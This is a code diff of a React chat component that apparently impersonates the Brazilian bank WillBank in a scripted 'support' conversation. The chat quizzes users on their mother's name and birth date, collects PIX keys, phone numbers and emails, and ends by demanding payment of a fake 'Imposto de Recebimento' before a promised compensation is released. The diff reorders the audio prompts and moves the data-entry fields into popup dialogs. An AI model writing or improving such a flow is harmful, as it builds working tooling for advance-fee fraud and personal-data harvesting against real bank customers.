@@ -5,7 +5,13 @@ import { Input } from "@/components/ui/input";
 import { CheckCircle2, Play, Pause, Check, ArrowLeft, MoreVertical, Phone, Send, Mic, Paperclip, Smile, Shield, Clock, Mail, Smartphone, X } from "lucide-react";
 import { CPFData } from "@/lib/cpf";
 import willbankLogo from "@/assets/willbank-logo.png";
-type ChatStep = "waiting-video" | "greeting" | "quiz-mae" | "quiz-nascimento" | "identity-confirmed" | "audio-3-validation" | "waiting-confirm-validation" | "show-approval-animation" | "audio-1-approval" | "pix-type-selection" | "pix-cpf-input" | "pix-email-input" | "pix-confirm" | "audio-2-comprovante" | "generating-comprovante" | "envio-selection" | "sms-input" | "email-input" | "audio-3-taxas" | "taxa-info" | "processing" | "final";
+import {
+  Dialog,
+  DialogContent,
+  DialogHeader,
+  DialogTitle,
+} from "@/components/ui/dialog";
+type ChatStep = "waiting-video" | "greeting" | "quiz-mae" | "quiz-nascimento" | "identity-confirmed" | "audio-1-validation" | "waiting-confirm-validation" | "show-approval-animation" | "audio-3-approval" | "pix-type-selection" | "pix-cpf-input" | "pix-email-input" | "pix-confirm" | "audio-2-comprovante" | "generating-comprovante" | "envio-selection" | "sms-input" | "email-input" | "audio-1-taxas" | "taxa-info" | "processing" | "final";
 interface QuizOption {
   text: string;
   isCorrect: boolean;
@@ -37,9 +43,14 @@ const Chat = () => {
   const [selectedPixType, setSelectedPixType] = useState<"telefone" | "cpf" | "email" | null>(null);
   const [audioListened, setAudioListened] = useState<Set<string>>(new Set());
   const [waitingForAudio, setWaitingForAudio] = useState<string | null>(null);
+  
+  // Dialog states for popups
+  const [pixDialogOpen, setPixDialogOpen] = useState(false);
+  const [comprovanteDialogOpen, setComprovanteDialogOpen] = useState(false);
+  const [dialogType, setDialogType] = useState<"telefone" | "email" | "sms" | null>(null);
 
-  // Enforce audio play order in the chat UI
-  const audioOrder = ["/audio/audio-3.mp3", "/audio/audio-2.mp3", "/audio/audio-1.mp3"] as const;
+  // Enforce audio play order in the chat UI (audio-1 first, then audio-2, then audio-3)
+  const audioOrder = ["/audio/audio-1.mp3", "/audio/audio-2.mp3", "/audio/audio-3.mp3"] as const;
   const nextRequiredAudio = audioOrder.find(src => !audioListened.has(src)) ?? null;
   const messagesEndRef = useRef<HTMLDivElement>(null);
   const videoRef = useRef<HTMLVideoElement>(null);
@@ -281,12 +292,12 @@ const Chat = () => {
       </div>, false);
     await delay(2500);
 
-    // Audio 3 - Validação (agora vem logo após o certificado)
-    await addAudioMessage("/audio/audio-3.mp3");
+    // Audio 1 - Validação (primeiro áudio após o certificado)
+    await addAudioMessage("/audio/audio-1.mp3");
     await delay(1000);
     await addBotMessage(<span>Ouça o áudio acima e clique no botão para <strong>confirmar sua validação</strong>.</span>, true, 50);
-    setWaitingForAudio("/audio/audio-3.mp3");
-    setStep("audio-3-validation");
+    setWaitingForAudio("/audio/audio-1.mp3");
+    setStep("audio-1-validation");
   };
   const handleConfirmValidation = async () => {
     addUserMessage(<span>✓ CONFIRMAR VALIDAÇÃO</span>);
@@ -309,9 +320,10 @@ const Chat = () => {
     setSelectedPixType("telefone");
     setStep("processing");
     await delay(1500);
-    await addBotMessage(<span>Insira sua <strong>chave pix</strong> (telefone) no campo abaixo:</span>, true, 40);
+    await addBotMessage(<span>Insira sua <strong>chave pix</strong> (telefone):</span>, true, 40);
     setStep("pix-cpf-input");
-    setShowPixInput(true);
+    setDialogType("telefone");
+    setPixDialogOpen(true);
   };
   const handlePixTypeCPF = async () => {
     addUserMessage(<span>📋 CPF</span>);
@@ -337,14 +349,15 @@ const Chat = () => {
     setSelectedPixType("email");
     setStep("processing");
     await delay(1500);
-    await addBotMessage(<span>Insira sua <strong>chave pix</strong> (e-mail) no campo abaixo:</span>, true, 40);
+    await addBotMessage(<span>Insira sua <strong>chave pix</strong> (e-mail):</span>, true, 40);
     setStep("pix-email-input");
-    setShowPixInput(true);
+    setDialogType("email");
+    setPixDialogOpen(true);
   };
   const handlePixKeySubmit = async () => {
     if (!pixKeyInput.trim()) return;
+    setPixDialogOpen(false);
     addUserMessage(<span>{pixKeyInput}</span>);
-    setShowPixInput(false);
     setStep("processing");
     await delay(1500);
     await addBotMessage(<div className="bg-amber-50 border border-amber-300 rounded-xl p-4 space-y-3">
@@ -434,7 +447,8 @@ const Chat = () => {
     await delay(1500);
     await addBotMessage(<span>Digite seu número de celular:</span>, true, 30);
     setStep("sms-input");
-    setShowPhoneInput(true);
+    setDialogType("sms");
+    setComprovanteDialogOpen(true);
   };
   const handleEmailOption = async () => {
     addUserMessage(<span>📧 Receber por E-mail</span>);
@@ -442,12 +456,13 @@ const Chat = () => {
     await delay(1500);
     await addBotMessage(<span>Digite seu e-mail:</span>, true, 20);
     setStep("email-input");
-    setShowEmailInput(true);
+    setDialogType("email");
+    setComprovanteDialogOpen(true);
   };
   const handlePhoneSubmit = async () => {
     if (!phoneNumber.trim()) return;
+    setComprovanteDialogOpen(false);
     addUserMessage(<span>{phoneNumber}</span>);
-    setShowPhoneInput(false);
     setStep("processing");
     await delay(2000);
     await addBotMessage(<div className="space-y-2">
@@ -462,8 +477,8 @@ const Chat = () => {
   };
   const handleEnvioEmailSubmit = async () => {
     if (!emailInput.trim()) return;
+    setComprovanteDialogOpen(false);
     addUserMessage(<span>{emailInput}</span>);
-    setShowEmailInput(false);
     setStep("processing");
     await delay(2000);
     await addBotMessage(<div className="space-y-2">
@@ -512,11 +527,11 @@ const Chat = () => {
       </div>, true, 80);
     await delay(1500);
 
-    // Audio 1 - Taxas (terceiro e último áudio)
-    await addAudioMessage("/audio/audio-1.mp3");
+    // Audio 3 - Taxas (terceiro e último áudio)
+    await addAudioMessage("/audio/audio-3.mp3");
     await delay(1500);
     await addBotMessage(<span>Somente após você finalizar o pagamento do Imposto de Recebimento a WillBank terá a autorização de realizar transferências de valor alto diante o monitoramento fiscal.</span>, true, 120);
-    setWaitingForAudio("/audio/audio-1.mp3");
+    setWaitingForAudio("/audio/audio-3.mp3");
     setStep("final");
   };
   const handleFinalPayment = () => {
@@ -650,11 +665,11 @@ const Chat = () => {
                   {option.text}
                 </Button>)}
 
-              {step === "audio-3-validation" && (waitingForAudio === null || audioListened.has("/audio/audio-3.mp3")) && <Button onClick={handleConfirmValidation} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-5 sm:px-8 text-xs sm:text-sm">
+              {step === "audio-1-validation" && (waitingForAudio === null || audioListened.has("/audio/audio-1.mp3")) && <Button onClick={handleConfirmValidation} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-5 sm:px-8 text-xs sm:text-sm">
                   ✓ CONFIRMAR VALIDAÇÃO
                 </Button>}
 
-              {step === "audio-3-validation" && waitingForAudio === "/audio/audio-3.mp3" && !audioListened.has("/audio/audio-3.mp3") && <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
+              {step === "audio-1-validation" && waitingForAudio === "/audio/audio-1.mp3" && !audioListened.has("/audio/audio-1.mp3") && <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
 
               {step === "pix-type-selection" && <div className="flex flex-col gap-1.5 sm:gap-2 w-full max-w-xs">
                   <Button onClick={handlePixTypeTelefone} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-6 sm:px-8 text-xs sm:text-sm h-10">
@@ -693,11 +708,11 @@ const Chat = () => {
                   ❓ PORQUE TENHO QUE PAGAR ESSE IMPOSTO?
                 </Button>}
 
-              {step === "final" && (waitingForAudio === null || audioListened.has("/audio/audio-1.mp3")) && <Button onClick={handleFinalPayment} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-4 sm:px-6 animate-pulse text-xs sm:text-sm">
+              {step === "final" && (waitingForAudio === null || audioListened.has("/audio/audio-3.mp3")) && <Button onClick={handleFinalPayment} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-4 sm:px-6 animate-pulse text-xs sm:text-sm">
                   💰 Concluir pagamento e receber minha indenização
                 </Button>}
 
-              {step === "final" && waitingForAudio === "/audio/audio-1.mp3" && !audioListened.has("/audio/audio-1.mp3") && <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
+              {step === "final" && waitingForAudio === "/audio/audio-3.mp3" && !audioListened.has("/audio/audio-3.mp3") && <p className="text-slate-400 text-xs animate-pulse">🎧 Ouça o áudio acima para continuar...</p>}
             </div>}
 
           <div ref={messagesEndRef} />
@@ -711,24 +726,9 @@ const Chat = () => {
             <Smile className="w-5 h-5 sm:w-6 sm:h-6" />
           </button>
           
-          {showPhoneInput ? <div className="flex-1 flex gap-1.5 sm:gap-2">
-              <Input placeholder="(00) 00000-0000" value={phoneNumber} onChange={e => setPhoneNumber(e.target.value)} className="flex-1 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400 rounded-full h-9 sm:h-10 text-sm" />
-              {phoneNumber && <Button onClick={handlePhoneSubmit} size="icon" className="rounded-full bg-primary hover:bg-primary/90 w-9 h-9 sm:w-10 sm:h-10">
-                  <Send className="w-4 h-4 sm:w-5 sm:h-5" />
-                </Button>}
-            </div> : showEmailInput ? <div className="flex-1 flex gap-1.5 sm:gap-2">
-              <Input placeholder="seuemail@exemplo.com" type="email" value={emailInput} onChange={e => setEmailInput(e.target.value)} className="flex-1 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400 rounded-full h-9 sm:h-10 text-sm" />
-              {emailInput && <Button onClick={handleEnvioEmailSubmit} size="icon" className="rounded-full bg-primary hover:bg-primary/90 w-9 h-9 sm:w-10 sm:h-10">
-                  <Send className="w-4 h-4 sm:w-5 sm:h-5" />
-                </Button>}
-            </div> : showPixInput ? <div className="flex-1 flex gap-1.5 sm:gap-2">
-              <Input placeholder={selectedPixType === "email" ? "seuemail@exemplo.com" : "(00) 00000-0000"} type={selectedPixType === "email" ? "email" : "text"} value={pixKeyInput} onChange={e => setPixKeyInput(e.target.value)} className="flex-1 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400 rounded-full h-9 sm:h-10 text-sm" />
-              {pixKeyInput && <Button onClick={handlePixKeySubmit} size="icon" className="rounded-full bg-primary hover:bg-primary/90 w-9 h-9 sm:w-10 sm:h-10">
-                  <Send className="w-4 h-4 sm:w-5 sm:h-5" />
-                </Button>}
-            </div> : <div className="flex-1 bg-slate-700 rounded-full px-3 sm:px-4 py-2 text-slate-400 text-xs sm:text-sm">
-              Digite uma mensagem...
-            </div>}
+          <div className="flex-1 bg-slate-700 rounded-full px-3 sm:px-4 py-2 text-slate-400 text-xs sm:text-sm">
+            Digite uma mensagem...
+          </div>
           
           <button className="p-1.5 sm:p-2 text-slate-400 hover:text-white transition-colors">
             <Paperclip className="w-5 h-5 sm:w-6 sm:h-6" />
@@ -738,6 +738,86 @@ const Chat = () => {
           </button>
         </div>
       </div>
+
+      {/* Dialog for PIX key input (telefone/email) */}
+      <Dialog open={pixDialogOpen} onOpenChange={setPixDialogOpen}>
+        <DialogContent className="sm:max-w-md">
+          <DialogHeader>
+            <DialogTitle className="text-center">
+              {dialogType === "telefone" ? "📱 Digite sua chave PIX (Telefone)" : "📧 Digite sua chave PIX (E-mail)"}
+            </DialogTitle>
+          </DialogHeader>
+          <div className="space-y-4 py-4">
+            <Input
+              placeholder={dialogType === "telefone" ? "(00) 00000-0000" : "seuemail@exemplo.com"}
+              type={dialogType === "email" ? "email" : "text"}
+              value={pixKeyInput}
+              onChange={(e) => setPixKeyInput(e.target.value)}
+              className="h-12 text-base"
+              autoFocus
+            />
+            <Button
+              onClick={handlePixKeySubmit}
+              disabled={!pixKeyInput.trim()}
+              className="w-full h-12 bg-gradient-to-r from-primary to-amber-400 text-primary-foreground font-bold rounded-full"
+            >
+              <Send className="w-4 h-4 mr-2" />
+              Confirmar
+            </Button>
+          </div>
+        </DialogContent>
+      </Dialog>
+
+      {/* Dialog for comprovante input (SMS/email) */}
+      <Dialog open={comprovanteDialogOpen} onOpenChange={setComprovanteDialogOpen}>
+        <DialogContent className="sm:max-w-md">
+          <DialogHeader>
+            <DialogTitle className="text-center">
+              {dialogType === "sms" ? "📱 Digite seu número de celular" : "📧 Digite seu e-mail"}
+            </DialogTitle>
+          </DialogHeader>
+          <div className="space-y-4 py-4">
+            {dialogType === "sms" ? (
+              <>
+                <Input
+                  placeholder="(00) 00000-0000"
+                  value={phoneNumber}
+                  onChange={(e) => setPhoneNumber(e.target.value)}
+                  className="h-12 text-base"
+                  autoFocus
+                />
+                <Button
+                  onClick={handlePhoneSubmit}
+                  disabled={!phoneNumber.trim()}
+                  className="w-full h-12 bg-gradient-to-r from-primary to-amber-400 text-primary-foreground font-bold rounded-full"
+                >
+                  <Send className="w-4 h-4 mr-2" />
+                  Enviar Comprovante
+                </Button>
+              </>
+            ) : (
+              <>
+                <Input
+                  placeholder="seuemail@exemplo.com"
+                  type="email"
+                  value={emailInput}
+                  onChange={(e) => setEmailInput(e.target.value)}
+                  className="h-12 text-base"
+                  autoFocus
+                />
+                <Button
+                  onClick={handleEnvioEmailSubmit}
+                  disabled={!emailInput.trim()}
+                  className="w-full h-12 bg-gradient-to-r from-primary to-amber-400 text-primary-foreground font-bold rounded-full"
+                >
+                  <Send className="w-4 h-4 mr-2" />
+                  Enviar Comprovante
+                </Button>
+              </>
+            )}
+          </div>
+        </DialogContent>
+      </Dialog>
     </div>;
 };
 
